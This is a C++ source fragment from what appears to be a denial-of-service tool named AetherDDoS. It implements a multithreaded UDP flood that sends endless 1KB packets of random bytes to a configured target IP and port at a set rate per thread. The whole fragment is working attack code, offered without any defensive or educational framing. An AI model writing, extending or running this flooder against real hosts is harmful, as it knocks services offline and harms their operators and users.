#include "aether_ddos.h"
#include <sys/socket.h>
#include <netinet/in.h>
#include <random>

void AetherDDoS::udp_flood(int thread_id) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 255);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { log("[-] UDP Socket failed: Thread " + std::to_string(thread_id)); return; }

    sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip.c_str(), &target_addr.sin_addr);

    while (true) {
        char payload[1024];
        for (int i = 0; i < 1024; ++i) payload[i] = dist(gen);
        sendto(sock, payload, 1024, 0, (sockaddr*)&target_addr, sizeof(target_addr));
        log("[*] UDP Thread " + std::to_string(thread_id) + ": 1KB sent!");
        std::this_thread::sleep_for(std::chrono::microseconds(1000000 / rate_per_thread));
    }
    close(sock);
}
